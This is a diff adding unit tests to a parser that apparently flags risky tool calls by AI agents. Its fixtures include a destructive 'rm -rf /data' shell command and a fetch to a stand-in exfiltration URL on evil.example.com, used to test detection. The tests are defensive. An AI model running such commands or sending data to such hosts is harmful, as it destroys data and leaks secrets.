@@ -118,6 +118,34 @@ class TestMcpAgentParser(unittest.TestCase):
         self.assertEqual(validate(event), [])
         self.assertNotIn("src_endpoint", event)
 
+    def test_destructive_command_indicator_r5(self):
+        event = PARSER.parse(_raw({"tool": "run_shell", "arguments": {"cmd": "rm -rf /data"}}))
+        self.assertTrue(event["unmapped"]["mcp"]["destructive_command_indicator"])
+
+    def test_benign_command_no_destructive_indicator(self):
+        event = PARSER.parse(_raw({"tool": "read_file", "arguments": {"path": "/tmp/x"}}))
+        self.assertFalse(event["unmapped"]["mcp"]["destructive_command_indicator"])
+
+    def test_egress_domain_extracted_r4(self):
+        event = PARSER.parse(_raw({"tool": "fetch_url",
+                                   "arguments": {"url": "https://evil.example.com/exfil?x=1"}}))
+        self.assertEqual(event["unmapped"]["mcp"]["egress_domain"], "evil.example.com")
+        self.assertTrue(event["unmapped"]["mcp"]["is_egress_call"])
+
+    def test_non_egress_call_no_domain_no_gate(self):
+        event = PARSER.parse(_raw({"tool": "read_file", "arguments": {"path": "/tmp/x"}}))
+        self.assertNotIn("egress_domain", event["unmapped"]["mcp"])
+        self.assertFalse(event["unmapped"]["mcp"]["is_egress_call"])
+
+    def test_egress_tool_name_without_url_does_not_set_gate(self):
+        """A tool NAME that merely suggests network egress, with no
+        parseable URL argument, must not set is_egress_call -- would wrongly
+        gate the R4 rule open with nothing real to check against the
+        allowlist (see mcp_agent.py::_egress_domain's docstring)."""
+        event = PARSER.parse(_raw({"tool": "fetch_url", "arguments": {"note": "no url here"}}))
+        self.assertFalse(event["unmapped"]["mcp"]["is_egress_call"])
+        self.assertNotIn("egress_domain", event["unmapped"]["mcp"])
+
 
 if __name__ == "__main__":
     unittest.main(verbosity=2)
